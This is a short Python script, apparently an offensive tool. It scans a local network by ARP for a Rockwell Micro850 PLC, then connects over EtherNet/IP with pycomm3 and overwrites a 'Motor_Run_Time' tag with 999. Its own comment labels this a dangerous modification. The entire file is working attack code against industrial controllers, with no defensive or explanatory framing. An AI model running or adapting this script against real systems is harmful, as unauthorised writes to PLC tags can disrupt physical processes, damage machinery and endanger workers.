from pycomm3 import CIPDriver
import scapy.all as scapy

# Function to discover Rockwell PLC in the network
def find_plc_ip():
    print("[*] Scanning network for Rockwell Micro850 PLC...")

    # Use ARP request to scan the subnet
    request = scapy.ARP(pdst="192.168.1.1/24")  # Adjust subnet as needed
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answered_list = scapy.srp(packet, timeout=2, verbose=False)[0]

    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        if mac.startswith("00:00:BC"):  # Example MAC prefix for Rockwell (change if needed)
            print(f"[+] PLC Found: IP = {ip}, MAC = {mac}")
            return ip

    print("[-] No Rockwell PLCs found.")
    return None

# Function to modify a PLC parameter
def modify_plc_parameter(plc_ip):
    if not plc_ip:
        print("[-] PLC IP not found. Exiting...")
        return
    
    print(f"[*] Connecting to PLC at {plc_ip}...")
    with CIPDriver(f"ethernet-ip://{plc_ip}") as plc:
        tag = "Motor_Run_Time"  # Adjust tag based on actual PLC configuration
        new_value = 999  # Dangerous modification (example: setting motor run time too high)
        
        try:
            print(f"[*] Modifying parameter {tag} to {new_value}")
            plc.write(tag, new_value)
            print(f"[+] Parameter {tag} successfully modified.")
        except Exception as e:
            print(f"[-] Error modifying parameter: {e}")

# Main execution
plc_ip = find_plc_ip()
modify_plc_parameter(plc_ip)